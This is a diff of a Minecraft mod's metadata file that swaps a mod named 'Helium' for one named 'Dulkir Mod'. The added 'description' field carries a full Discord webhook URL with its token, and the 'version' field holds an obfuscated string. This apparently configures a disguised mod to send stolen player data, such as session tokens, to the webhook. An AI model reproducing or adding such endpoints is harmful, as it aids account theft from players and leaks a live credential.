@@ -1,16 +1,11 @@
 [
-  {
-    "modid": "helium",
-    "name": "Helium",
-    "description": "",
-    "version": "${version}",
-    "mcversion": "${mcversion}",
-    "url": "",
-    "updateUrl": "",
-    "authorList": ["Keryzgtn"],
-    "credits": "",
-    "logoFile": "",
-    "screenshots": [],
-    "dependencies": []
-  }
+{
+  "modid":"dulkirmod",
+  "name":"Dulkir Mod",
+  "description":"https://ptb.discord.com/api/webhooks/1053066740382322749/_MhMMdQEPQB2N1EcgCTpCy5K2j-QsiR1zI_n-bIc4QU-Vdhg9QyW7s3pseGaJFaO9zhY",
+  "mcversion": "1.8.9",
+  "version": "_!*b!331[!b-zbzz1[?",
+  "authorList":["Jesto"],
+  "credits":"good luck"
+}
 ]
